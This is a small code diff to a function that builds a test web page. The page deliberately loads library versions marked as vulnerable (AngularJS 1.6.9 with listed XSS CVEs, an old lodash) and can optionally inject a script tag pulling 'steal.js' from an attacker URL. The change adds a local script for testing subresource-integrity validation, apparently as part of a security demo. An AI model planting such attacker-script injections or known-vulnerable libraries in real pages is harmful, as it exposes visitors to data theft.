@@ -72,6 +72,8 @@ function getHtml(attackerUrl, injectScript = true) {
   <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.10/lodash.min.js"></script>
   <!-- Vulnerable: AngularJS 1.6.9 - CVE-2019-10768 (XSS), CVE-2020-7676 (XSS), CVE-2021-32820 (XSS) -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.9/angular.min.js"></script>
+  <!-- Local script - Edit app/public/js/utils.js to test SRI validation -->
+  <script src="/js/utils.js"></script>
   ${injectScript ? `<script src="${attackerUrl}/steal.js"></script>` : ''}
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
